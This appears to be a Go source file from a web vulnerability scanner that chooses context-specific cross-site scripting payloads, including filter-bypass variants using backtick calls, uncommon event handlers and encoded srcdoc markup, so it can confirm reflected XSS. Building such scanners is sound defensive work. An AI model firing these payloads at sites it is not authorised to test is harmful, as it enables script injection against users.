// xss_payloads.go chooses which breakout to send, given where the value was observed to land.
//
// The check that uses this sends a bare canary first and classifies the result, because context
// decides exploitability and no single payload spans the contexts. Three of the cases
// cmd/xsschallenge measured as misses are missed for the same structural reason: their exploits
// contain no quote character at all, so a payload built around closing a quote could not have
// produced evidence in them no matter how the response was searched.
//
//   - an unquoted attribute value needs only a space and a new attribute
//   - a `javascript:` URL needs the scheme, and opens no tag at all
//   - an `srcdoc` value is HTML-encoded in the response and decoded back into markup by the
//     attribute parser, so the encoded form IS the exploit
package scanner

// xssPayload is one breakout attempt: a way to build the payload around a fresh canary, and a note
// naming the context it targets so evidence can say what was attempted.
type xssPayload struct {
	build func(canary string) string
	note  string
	// confirm is what success looks like for THIS payload. Without it every payload was checked
	// against the generic markers, which most of them cannot produce - see xss_confirm.go.
	confirm xssConfirm
	// bit is the evidence a confirmation establishes. A markup breakout and a JavaScript string
	// breakout are different findings about different grammars, and reporting one as the other
	// would make the evidence text describe something that did not happen.
	bit XSSEvidence
}

// xssPayloadsForContexts returns the breakouts worth sending for the observed contexts, most
// specific first, with duplicates removed.
//
// An empty or unclassifiable context list falls back to the generic pair — a tag breakout and a
// single-quoted string breakout. That is what the check sent unconditionally before, so a point
// whose context cannot be read is no worse served than it used to be.
func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
	if len(contexts) == 0 {
		return genericXSSPayloads()
	}

	var out []xssPayload
	seen := map[string]bool{}
	add := func(p xssPayload) {
		if seen[p.note] {
			return
		}
		seen[p.note] = true
		out = append(out, p)
	}

	for _, c := range contexts {
		switch c.Kind {
		case xssCtxText:
			// A text node needs NO leading quote: the value is already being parsed as content,
			// so a bare `<` opens an element. The quote-prefixed htmlBreakoutPayload belongs to
			// the unknown-context bank, where the value might sit inside a quoted attribute and
			// `">` is what closes it. Using it here was not merely redundant. An insertion point
			// whose container refuses DQUOTE — a Cookie value, RFC 6265 §5.2 — refused every
			// text-node payload before it was sent, and checkReflectedXSSCore skips a refused send,
			// so a cookie reflected into a text node produced no probe at all and the row could
			// never report however vulnerable the target was.
			add(xssPayload{build: textNodeBreakoutPayload, note: "tag injection in a text node",
				confirm: confirmMarkupBreakout})
			// The same breakout with a handler a blocklist is unlikely to name. One extra request,
			// and without it a host that strips onerror/onload reads as not vulnerable.
			add(xssPayload{build: textNodeAltHandlerPayload,
				note:    "tag injection with a handler outside the usual blocklist",
				confirm: confirmAltHandlerBreakout})

		case xssCtxAttrValue:
			// A URL-valued attribute gets the scheme payload, and is STILL an attribute value: the
			// quote-closing and attribute-injection breakouts below apply to it exactly as to any
			// other. Treating the URL case as exclusive left <img src=…> with nothing but a
			// javascript: URL, which no browser runs from an image source, so an unescaped or
			// unquoted src was never probed with a payload that could work there.
			if c.IsURLAttr() {
				// The scheme is the exploit. No tag is opened and no quote is needed, so a
				// quote-closing payload produces nothing here.
				add(xssPayload{build: javascriptURLPayload, note: "javascript: scheme in a URL-valued attribute",
					confirm: confirmJavaScriptURL, bit: XSSEvidenceURLScheme})
			}
			switch {
			case c.IsHTMLAttr():
				// srcdoc's value is unescaped back into markup before the inner document is
				// parsed, so the payload does not need to survive as raw markup in the response —
				// it needs to survive as an ENCODED attribute value, which is the opposite of what
				// every other context asks for and why substring matching on raw markup missed it.
				add(xssPayload{build: srcdocBreakoutPayload, note: "markup via an HTML-valued attribute (srcdoc)",
					confirm: confirmSrcdocBreakout})
			case c.IsEventAttr():
				// The value is already JavaScript, but that does NOT mean an expression suffices: the
				// canary almost always lands inside a string literal in that handler, and a host that
				// escapes the literal correctly is not vulnerable. So this context gets the same
				// literal breakouts the <script> context gets, and the same lexer decides them. A bare
				// `alert(canary)` was sent here before, and its confirmation could not fail - the canary
				// being in a handler was the fact that chose this branch.
				for _, q := range []byte{'\'', '"'} {
					quote := q
					add(xssPayload{
						build:   func(canary string) string { return scriptBreakoutPayloadFor(quote, canary) },
						note:    "string-literal breakout inside an inline event handler (" + string(quote) + "-quoted)",
						confirm: confirmHandlerLiteralBreakout,
						bit:     XSSEvidenceScriptBreakout,
					})
					add(xssPayload{
						build:   func(canary string) string { return scriptBreakoutPayloadClosingCall(quote, canary) },
						note:    "literal-and-call breakout inside an inline event handler (" + string(quote) + "-quoted)",
						confirm: confirmHandlerLiteralBreakout,
						bit:     XSSEvidenceScriptBreakout,
					})
				}
			case c.Quote == 0:
				if loadsResource(c.TagName) {
					// An element that loads a resource fires error when the load fails, with no
					// user action and no focus. onfocus never fires on an <img> at all, so on such
					// an element the error handler is the injection that actually runs.
					add(xssPayload{build: unquotedAttrErrorPayload, note: "error-handler injection into an unquoted value",
						confirm: confirmEventAttrInjection, bit: XSSEvidenceAttrInjection})
					add(xssPayload{build: unquotedAttrErrorBacktickPayload, note: "error-handler injection into an unquoted value (backtick call)",
						confirm: confirmEventAttrInjectionBacktick, bit: XSSEvidenceAttrInjection})
				}
				// An unquoted value ends at the first space, so a space and an event-handler
				// attribute inject onto the element that is already there. Nothing needs closing,
				// which is exactly why no quote-based marker could ever appear.
				add(xssPayload{build: unquotedAttrPayload, note: "attribute injection into an unquoted value",
					confirm: confirmEventAttrInjection, bit: XSSEvidenceAttrInjection})
				// The same injection with the call written in backticks instead of parentheses. A host
				// that filters `(` and `)` — a common defence against `alert(...)` — passes this form
				// through, and a backtick is legal in an unquoted attribute value, so the handler still
				// parses as one attribute. Without it such a host reads as clean even though the
				// attribute injection it allows is identical (VulnerableApp XSSInImgTagAttribute
				// LEVEL_4 filters parentheses and reflects the backtick form verbatim).
				add(xssPayload{build: unquotedAttrBacktickPayload, note: "attribute injection into an unquoted value (backtick call)",
					confirm: confirmEventAttrInjectionBacktick, bit: XSSEvidenceAttrInjection})
			default:
				quote := c.Quote
				if loadsResource(c.TagName) {
					add(xssPayload{
						build:   func(canary string) string { return quotedAttrErrorPayload(quote, canary) },
						note:    "error-handler injection into a quoted value",
						confirm: confirmEventAttrInjection,
						bit:     XSSEvidenceAttrInjection,
					})
				}
				add(xssPayload{
					build:   func(canary string) string { return quotedAttrBreakoutPayload(quote, canary) },
					note:    "tag breakout from a quoted attribute value",
					confirm: confirmMarkupBreakout,
				})
				// ZAP's second attempt, and the one that matters when the host escapes `<` and `>`
				// but leaves the quote alone. No tag can be opened there, so the exploit is to add
				// an attribute to the element already present. Both cmd/xsschallenge quoted-attribute
				// endpoints are exactly this shape, and the tag breakout above cannot reach either.
				add(xssPayload{
					build:   func(canary string) string { return quotedAttrEventPayload(quote, canary) },
					note:    "attribute injection into a quoted attribute value",
					confirm: confirmEventAttrInjection,
					bit:     XSSEvidenceAttrInjection,
				})
			}

		case xssCtxScript:
			// Inside script the canary is already JavaScript; the only question is which literal
			// encloses it, and that is a fact the JS lexer establishes rather than something to
			// guess. c.Quote carries it when the lexer could place the canary; a zero value means
			// it could not, and then both quote styles are tried rather than one being assumed.
			//
			// The escape-the-escaper form is sent alongside the plain one because it defeats a
			// host that escapes quotes but not backslashes, and costs one request.
			for _, q := range scriptHostQuotes(c) {
				quote := q
				add(xssPayload{
					build:   func(canary string) string { return scriptBreakoutPayloadFor(quote, canary) },
					note:    "JavaScript string breakout (" + string(quote) + "-quoted host)",
					confirm: confirmScriptBreakout,
					bit:     XSSEvidenceScriptBreakout,
				})
				add(xssPayload{
					build:   func(canary string) string { return scriptBreakoutPayloadClosingCall(quote, canary) },
					note:    "literal-and-call breakout (" + string(quote) + "-quoted host)",
					confirm: confirmScriptBreakout,
					bit:     XSSEvidenceScriptBreakout,
				})
				add(xssPayload{
					build:   func(canary string) string { return scriptBreakoutPayloadEscaped(quote, canary) },
					note:    "JavaScript string breakout against a quote-escaping " + string(quote) + "-quoted host",
					confirm: confirmScriptBreakout,
					bit:     XSSEvidenceScriptBreakout,
				})
			}

		case xssCtxRCDATA:
			// `<` is literal inside title/textarea; only the element's own end tag closes it, so
			// the payload has to emit that end tag before any markup can begin.
			tag := c.TagName
			add(xssPayload{
				build:   func(canary string) string { return rcdataBreakoutPayload(tag, canary) },
				note:    "markup after closing an RCDATA element",
				confirm: confirmMarkupBreakout,
			})

		case xssCtxComment:
			add(xssPayload{build: commentBreakoutPayload, note: "markup after closing a comment",
				confirm: confirmMarkupBreakout})
		}
	}

	if len(out) == 0 {
		return genericXSSPayloads()
	}
	return out
}

// genericXSSPayloads is the fallback when nothing could be classified: what the check sent
// unconditionally before this file existed.
func genericXSSPayloads() []xssPayload {
	return []xssPayload{
		{build: htmlBreakoutPayload, note: "tag breakout"},
		{build: func(c string) string { return scriptBreakoutPayloadFor('\'', c) }, note: "JavaScript string breakout"},
		{build: func(c string) string { return scriptBreakoutPayloadFor('"', c) }, note: "JavaScript string breakout (double-quoted host)"},
	}
}

// scriptHostQuotes returns the quote styles worth attacking for a script-context occurrence:
// the one the lexer actually found, or both when it could not place the canary.
//
// Trying both is one extra request and is the honest answer to "we do not know". Assuming one
// would silently skip every host using the other, which is the shape of failure this whole file
// exists to remove.
func scriptHostQuotes(c xssContext) []byte {
	switch c.Quote {
	case '\'', '"':
		return []byte{c.Quote}
	}
	return []byte{'\'', '"'}
}

// quotedAttrBreakoutPayload closes a quoted attribute value and its tag, then opens an element
// that proves execution. The quote has to match the one that opened the value: closing a
// double-quoted value with a single quote does nothing.
func quotedAttrBreakoutPayload(quote byte, canary string) string {
	q := `"`
	if quote == '\'' {
		q = `'`
	}
	return q + `><svg id=` + canary + ` onload=alert(1)>`
}

// unquotedAttrBacktickPayload is unquotedAttrPayload with the handler call written in backticks.
//
// The exploit is the same attribute injection; only the syntax of the call differs. `alert\`x\“ is a
// tagged template literal, so it still invokes alert, but it contains no parenthesis — which is
// what a filter that strips `(` and `)` removes. Reflecting this form back verbatim proves the
// injection reached an event handler even though the parenthesised form was filtered.
func unquotedAttrBacktickPayload(canary string) string {
	return canary + " autofocus onfocus=alert`" + canary + "`"
}

// unquotedAttrPayload injects a new attribute onto the element already being parsed. An unquoted
// value terminates at whitespace, so no quote is involved anywhere — which is why this case is
// invisible to a quote-closing payload and to any marker built from one.
func unquotedAttrPayload(canary string) string {
	// The canary goes INSIDE the handler expression, not merely alongside it. Evidence for an
	// attribute injection is the canary sitting in a parsed event-handler value, so a payload that
	// left it in `value` and `id` could not be confirmed however well it worked.
	//
	// A leading token is load-bearing: whitespace after `=` is skipped by the parser, so a payload
	// starting with a space has its first word consumed as the value being injected into rather
	// than becoming an attribute. And an unquoted value may not contain `=`, which is why the
	// expression is a call rather than an assignment.
	return canary + ` autofocus onfocus=alert(` + canary + `)`
}

// quotedAttrEventPayload closes the quoted value and adds an event handler WITHOUT opening a tag.
//
// This is the payload for a host that escapes `<` and `>` but not the quote - the commonest
// half-done escaping there is. quotedAttrBreakoutPayload assumes a tag can be opened; where it
// cannot, this one still runs, and the canary sits inside the handler so the injection is
// confirmable.
// altHandlerBreakoutPayload opens a tag whose event handler is not onerror or onload.
//
// Blocklists overwhelmingly name those two, and a filter that deletes them leaves the element intact
// and every other handler untouched - so the tag breakout appears to fail while the host is fully
// exploitable. `<details open ontoggle=…>` fires on parse with no interaction, and the canary sits
// inside the handler so the parser can confirm it.
func altHandlerBreakoutPayload(canary string) string {
	return `"><details open ontoggle=alert(` + canary + `)>`
}

// textNodeBreakoutPayload opens an element from a value the parser is already treating as content.
//
// It is htmlBreakoutPayload without the leading quote, and the difference is the whole point. In a
// text node `<` starts a tag on its own; the quote was inherited from the unknown-context bank,
// where the value may sit inside a quoted attribute and only `">` closes it. Carrying it here cost
// real detections: a container that refuses DQUOTE (a Cookie value) rejected the payload before it
// was sent, and a refused send is skipped, so the text node was never probed.
//
// Confirmed by confirmMarkupBreakout, which asks the parser for `<svg id=CANARY>` as a real element
// — the same evidence the quote-prefixed form was confirmed by, so this is not a weaker check.
func textNodeBreakoutPayload(canary string) string {
	return `<svg id=` + canary + ` onload=alert(1)>`
}

// textNodeAltHandlerPayload is altHandlerBreakoutPayload without the leading `">`, for the same
// reason textNodeBreakoutPayload drops it: in a text node the element opens on its own.
func textNodeAltHandlerPayload(canary string) string {
	return `<details open ontoggle=alert(` + canary + `)>`
}

func quotedAttrEventPayload(quote byte, canary string) string {
	q := `"`
	if quote == '\'' {
		q = `'`
	}
	return q + ` autofocus onfocus=` + q + `alert(` + canary + `)`
}

// javascriptURLPayload puts an executable scheme in a URL-valued attribute. It must sit at the
// START of the value to be the scheme, so unlike every other payload here it does not prefix
// anything to close a construct.
func javascriptURLPayload(canary string) string {
	return `javascript:alert(` + canary + `)`
}

// eventHandlerPayload is an expression for a context that is already JavaScript.
func eventHandlerPayload(canary string) string {
	return `alert(` + canary + `)`
}

// srcdocBreakoutPayload is markup in the HTML-encoded form srcdoc takes. The attribute parser
// decodes it back into markup before parsing the inner document, so the encoded text is the live
// payload — a response that shows only the encoded form is not evidence of safety here, which is
// the inversion that makes this case defeat an encoding check.
func srcdocBreakoutPayload(canary string) string {
	return `&lt;svg id=` + canary + ` onload=alert(1)&gt;`
}

// rcdataBreakoutPayload closes the RCDATA element first, since `<` is literal inside it.
func rcdataBreakoutPayload(tag, canary string) string {
	if tag == "" {
		tag = "textarea"
	}
	return `</` + tag + `><svg id=` + canary + ` onload=alert(1)>`
}

// commentBreakoutPayload closes the comment before opening an element.
func commentBreakoutPayload(canary string) string {
	return `--><svg id=` + canary + ` onload=alert(1)>`
}

// resourceLoadingTags are elements that fetch a resource named by an attribute and dispatch error
// when the fetch fails, on insertion and without any user action.
var resourceLoadingTags = map[string]bool{
	"img": true, "image": true, "input": true, "video": true, "audio": true,
	"source": true, "track": true, "embed": true, "object": true,
}

func loadsResource(tag string) bool { return resourceLoadingTags[tag] }

// unquotedAttrErrorPayload injects an error handler onto a resource-loading element. The canary
// leads, so the attribute being injected into keeps a value (a relative URL that will not load),
// and it sits inside the handler so the injection is confirmable.
func unquotedAttrErrorPayload(canary string) string {
	return canary + ` onerror=alert(` + canary + `)`
}

// unquotedAttrErrorBacktickPayload is unquotedAttrErrorPayload with the call in backticks, for a
// host that filters parentheses (see unquotedAttrBacktickPayload).
func unquotedAttrErrorBacktickPayload(canary string) string {
	return canary + " onerror=alert`" + canary + "`"
}

// quotedAttrErrorPayload closes a quoted value and adds an error handler, without opening a tag.
func quotedAttrErrorPayload(quote byte, canary string) string {
	q := `"`
	if quote == '\'' {
		q = `'`
	}
	return canary + q + ` onerror=` + q + `alert(` + canary + `)`
}
